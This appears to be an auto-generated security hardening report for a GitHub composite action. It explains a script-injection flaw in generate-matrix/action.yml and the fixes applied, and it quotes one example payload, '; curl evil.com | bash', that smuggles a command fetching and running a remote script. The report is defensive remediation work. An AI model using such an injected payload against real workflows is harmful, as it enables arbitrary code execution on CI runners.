<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action/v5.7.19

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **freckle--stack-action/v5.7.19** was hardened automatically. 1 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a): The composite action directly interpolates ${{ inputs.find-options }} inside a run: shell command at line 25. An attacker calling this action can supply a malicious value (e.g., "; curl evil.com | bash") to execute arbitrary commands on the runner. The offending line is: `find ${{ inputs.find-options }} -printf "%f"\n' | sort -V | jq --slurp`

Locations:

- `generate-matrix/action.yml:25`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Fixed script injection in generate-matrix/action.yml line 25. Moved ${{ inputs.find-options }} out of the run: shell command and into an env: block as FIND_OPTIONS. The shell script now references $FIND_OPTIONS (unquoted, as intended for multi-argument word splitting) instead of directly interpolating the GitHub Actions expression, preventing arbitrary command injection via the find-options input.

### Iteration 2

**Fixes applied:** script-injection, github-env-injection

**Notes:**

Fixed both findings in generate-matrix/action.yml:
1. script-injection: Replaced unquoted `find $FIND_OPTIONS` with bash array parsing: `read -ra find_opts <<< "$FIND_OPTIONS"` followed by `find "${find_opts[@]}"`. This prevents shell metacharacters in the input from being interpreted by the shell.
2. github-env-injection: Used a randomly generated heredoc delimiter (`EOM_$(openssl rand -hex 16)`) to prevent newline injection from closing the heredoc prematurely and injecting arbitrary key-value pairs into GITHUB_OUTPUT. The find output is captured into a variable and written with quoted `printf '%s\n' "$stack_yamls"`.

